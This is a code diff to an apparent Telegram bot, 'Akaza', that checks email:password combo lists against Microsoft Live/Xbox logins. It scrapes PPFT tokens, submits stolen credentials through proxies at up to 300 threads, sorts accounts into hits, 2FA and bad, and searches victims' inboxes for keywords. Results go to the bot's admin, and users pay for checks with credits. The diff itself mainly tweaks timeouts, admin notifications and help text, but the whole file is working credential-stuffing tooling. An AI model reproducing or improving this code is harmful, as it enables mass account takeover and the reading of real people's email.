@@ -93,12 +93,6 @@ class AkazaDatabase:
     def add_credits(self, uid, amount):
         self._execute('UPDATE users SET credits = credits + ? WHERE user_id = ?', (amount, uid))
 
-    def set_credits(self, uid, amount):
-        self._execute('UPDATE users SET credits = ? WHERE user_id = ?', (amount, uid))
-
-    def reset_credits(self, uid):
-        self._execute('UPDATE users SET credits = 0 WHERE user_id = ?', (uid,))
-
     def use_credit(self, uid):
         if uid == ADMIN_ID: return
         self._execute('UPDATE users SET credits = MAX(0, credits - 1), total_checks = total_checks + 1 WHERE user_id = ?', (uid,))
@@ -191,12 +185,12 @@ class AkazaChecker:
     def login_flux(self, email, password):
         try:
             auth_url = 'https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en'
-            r = self.session.get(auth_url, timeout=10)
+            r = self.session.get(auth_url, timeout=12)
             ppft = re.search('value=\\\\"(.+?)\\\\"', r.text, re.S) or re.search('value="(.+?)"', r.text, re.S) or re.search("sFTTag:'(.+?)'", r.text, re.S) or re.search('sFTTag:"(.+?)"', r.text, re.S) or re.search('name="PPFT".*?value="(.+?)"', r.text, re.S)
             up = re.search('"urlPost":"(.+?)"', r.text, re.S) or re.search("urlPost:'(.+?)'", r.text, re.S) or re.search('<form.*?action="(.+?)"', r.text, re.S)
             if not ppft or not up: return 'ERROR', None
             data = {'login': email, 'loginfmt': email, 'passwd': password, 'PPFT': ppft.group(1)}
-            r_login = self.session.post(up.group(1).replace('&amp;', '&'), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=10)
+            r_login = self.session.post(up.group(1).replace('&amp;', '&'), data=data, headers={'Content-Type': 'application/x-www-form-urlencoded'}, allow_redirects=True, timeout=12)
             if '#' in r_login.url:
                 tk = parse_qs(urlparse(r_login.url).fragment).get('access_token', ['None'])[0]
                 if tk and tk != 'None': return 'TOKEN', tk
@@ -342,7 +336,7 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
     s = db_api.get_user_settings(uid)
     px = user_proxies.get(uid, []) or PROXIES_LIST
     thr = min(s['threads'], 300) if px else min(s['threads'], 10)
-    await c.bot.send_message(ADMIN_ID, f"🚀 User <code>{uid}</code> started checking {len(lines)} accounts.")
+    await c.bot.send_message(ADMIN_ID, f"🚀 User <code>{uid}</code> ({u.effective_user.first_name}) started checking {len(lines)} accounts.")
     msg = await (u.callback_query.message.reply_text("🚀 Starting...") if u.callback_query else u.message.reply_text("🚀 Starting..."))
     hits, bad, tfa, err, checked, start_t, last_up, last_h = 0, 0, 0, 0, 0, time.time(), 0, []
     sid = str(uuid.uuid4().hex[:6])
@@ -384,12 +378,16 @@ async def handle_combo(u: Update, c: ContextTypes.DEFAULT_TYPE, text=None):
                 f.seek(0)
                 if u.callback_query: await u.callback_query.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
                 else: await u.message.reply_document(f, filename=disp, caption=f"✅ {disp}")
-                await c.bot.send_document(ADMIN_ID, io.BytesIO(content), filename=disp, caption=f"📁 User {u.effective_user.first_name} ({uid}) Result\n💰 Credits: {db_api.get_credits(uid)}")
+                await c.bot.send_document(ADMIN_ID, io.BytesIO(content), filename=disp, caption=f"📁 User <code>{uid}</code> Result\n👤 Name: <code>{u.effective_user.first_name}</code>\n💰 Credits left: <code>{db_api.get_credits(uid)}</code>", parse_mode="HTML")
             os.remove(p)
+    if hits == 0 and tfa == 0:
+        txt = f"✅ Done! Hits: {hits} | 2FA: {tfa} | Bad: {bad}"
+        if u.callback_query: await u.callback_query.message.reply_text(txt)
+        else: await u.message.reply_text(txt)
 
 async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
     q = u.callback_query; await q.answer(); uid = q.from_user.id
-    if q.data == "settings": await q.edit_message_text(f"⚙️ <b>Settings</b>\n\nThreads: <code>{db_api.get_user_settings(uid)['threads']}</code>\nUse /threads [N] to change.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
+    if q.data == "settings": await q.edit_message_text(f"⚙️ <b>Settings</b>\n\nThreads: <code>{db_api.get_user_settings(uid)['threads']}</code>\nUse /threads [N] to change (1-300).", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
     elif q.data == "stats":
         st = db_api.user_stats(uid)
         await q.edit_message_text(f"📊 <b>Statistics</b>\n\nChecks: <code>{st['checks']}</code>\nHits: <code>{st['hits']}</code>\nCredits: <code>{st['credits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
@@ -403,16 +401,18 @@ async def cb_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
                "/threads [N] - Set check threads\n"
                "/skw - Stop adding keywords\n"
                "/ckw - Clear all keywords\n"
-               "/start - Dashboard\n\n"
+               "/start - Return to dashboard\n\n"
                "<b>How to use:</b>\n"
-               "• Send combo or upload .txt file.\n"
+               "• Send combo as text (email:pass) or upload .txt file.\n"
+               "• If uploading .txt, select 'Combo'.\n"
                "• Keywords are searched in inbox if added.")
         await q.edit_message_text(txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
     elif q.data == "back": await start(u, c)
     elif q.data == "set_combo": await handle_combo(u, c)
     elif q.data == "set_proxy":
-        user_proxies[uid] = [l.strip() for l in pending_files.pop(uid, "").splitlines() if l.strip()]
-        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies.")
+        content = pending_files.pop(uid, "")
+        user_proxies[uid] = [l.strip() for l in content.splitlines() if l.strip()]
+        await q.edit_message_text(f"✅ Loaded {len(user_proxies[uid])} proxies (one-time use).")
     elif q.data == "admin" and db_api.is_mod(uid):
         st = db_api.get_global_stats()
         await q.edit_message_text(f"🛠 <b>Admin Panel</b>\n\nTotal Users: <code>{st['total']}</code>\nGlobal Checks: <code>{st['checks']}</code>\nGlobal Hits: <code>{st['hits']}</code>", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]), parse_mode="HTML")
@@ -439,6 +439,17 @@ async def admin_cmd_handler(u: Update, c: ContextTypes.DEFAULT_TYPE):
             try: await c.bot.send_message(t, txt); await asyncio.sleep(0.05)
             except: pass
         await u.message.reply_text("✅ Broadcast finished.")
+    elif cmd == "!!stats":
+        st = db_api.get_global_stats()
+        await u.message.reply_text(f"📊 <b>Admin Stats</b>\n\nUsers: {st['total']}\nChecks: {st['checks']}\nHits: {st['hits']}", parse_mode="HTML")
+    elif cmd == "!!help":
+        txt = ("🛠 <b>Admin Commands</b>\n\n"
+               "!!addcredits [uid] [amt]\n"
+               "!!grant [uid]\n"
+               "!!ban [uid]\n"
+               "!!broadcast [msg]\n"
+               "!!stats")
+        await u.message.reply_text(txt, parse_mode="HTML")
 
 def main():
     db_api.init_db()
